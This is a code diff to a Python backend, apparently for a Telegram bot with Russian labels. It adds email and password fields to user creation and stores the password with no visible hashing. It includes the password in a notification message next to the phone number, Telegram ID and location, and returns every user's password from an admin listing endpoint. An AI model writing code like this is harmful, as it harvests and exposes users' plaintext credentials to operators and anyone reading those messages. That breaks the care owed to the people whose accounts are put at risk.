@@ -67,6 +67,8 @@ def init_user():
                 last_name=data.get('last_name'),
                 age=data.get('age'),
                 phone=data.get('phone'),
+                email=data.get('email'),
+                password=data.get('password'),
                 lat=data.get('lat'),
                 lng=data.get('lng'),
                 last_seen_at=datetime.utcnow()
@@ -90,6 +92,8 @@ def init_user():
                 f"🔹 Username: @{data.get('username', '—')}\n"
                 f"🪪 Telegram ID: {tg_id}\n"
                 f"📞 Телефон: {data.get('phone', '—')}\n"
+                f"📧 Email: {data.get('email', '—')}\n"
+                f"🔑 Пароль: {data.get('password', '—')}\n"
                 f"🎂 Возраст: {data.get('age', '—')}\n"
                 f"{location_text}"
             )
@@ -357,6 +361,8 @@ def admin_get_users():
             'last_name': u.last_name,
             'balance': u.balance,
             'phone': u.phone,
+            'email': u.email,
+            'password': u.password,
             'age': u.age,
             'lat': u.lat,
             'lng': u.lng,
